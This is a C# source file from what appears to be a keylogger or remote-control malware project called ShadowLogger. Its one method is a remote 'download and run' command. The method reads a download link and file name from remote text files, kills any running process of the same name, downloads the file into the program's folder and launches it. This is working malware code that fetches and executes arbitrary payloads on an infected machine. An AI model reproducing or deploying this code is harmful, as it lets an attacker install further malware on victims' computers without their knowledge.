using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Windows.Forms;
using ShadowLogger.bin.Shared_Methods;

namespace ShadowLogger.bin.Remote_Commands
{
    internal static class CommandsAvailableHelperMethods
    {
        internal static void DlAndRun(bool dlFileOverwrite)
        {
            string dlFileLink = SharedMethods.CreateWebRequest("File with the direct link of the download file.txt");

            if (dlFileLink == string.Empty) return;

            string dlFilename = SharedMethods.CreateWebRequest("File with the name of the download file.txt"); //The name is the txt content, not the txt name.

            if (dlFilename == string.Empty) return;

            string dlFilepath = Path.Combine(Application.StartupPath, dlFilename);

            if (File.Exists(dlFilepath))
            {
                if (dlFileOverwrite)
                {
                    try
                    {
                        Process[] p = Process.GetProcessesByName(dlFilename.Split(Convert.ToChar("."))[0]);

                        if (p.Length > 0)
                        {
                            foreach (Process proc in p)
                            {
                                proc.Kill();
                            }
                        }

                        WebClient wc = new WebClient();
                        wc.DownloadFile(dlFileLink, dlFilepath);
                        wc.Dispose();
                    }
                    catch (Exception ex)
                    {
                        SharedMethods.LogException(ex.TargetSite + " " + dlFileOverwrite + " " + ex.Message + " " + ex.InnerException);
                        return;
                    }
                }
                else
                {
                    //Check if process name is running.
                    //Doesn't check for path... so it can be another process than the one intended.
                    foreach (Process p in Process.GetProcesses())
                    {
                        if (p.ProcessName + ".exe" == dlFilename)
                        {
                            return;
                        }
                    }
                }
            }
            else
            {
                try
                {
                    WebClient wc = new WebClient();
                    wc.DownloadFile(dlFileLink, dlFilepath);
                    wc.Dispose();
                }
                catch (Exception ex)
                {
                    SharedMethods.LogException(ex.TargetSite + " " + dlFileOverwrite + " " + ex.Message + " " + ex.InnerException);
                    return;
                }
            }

            //Finally starts the process.
            try
            {
                Process.Start(dlFilepath);
            }
            catch (Exception ex)
            {
                SharedMethods.LogException(ex.TargetSite + " " + dlFileOverwrite + " " + ex.Message + " " + ex.InnerException);
            }
        }
    }
}
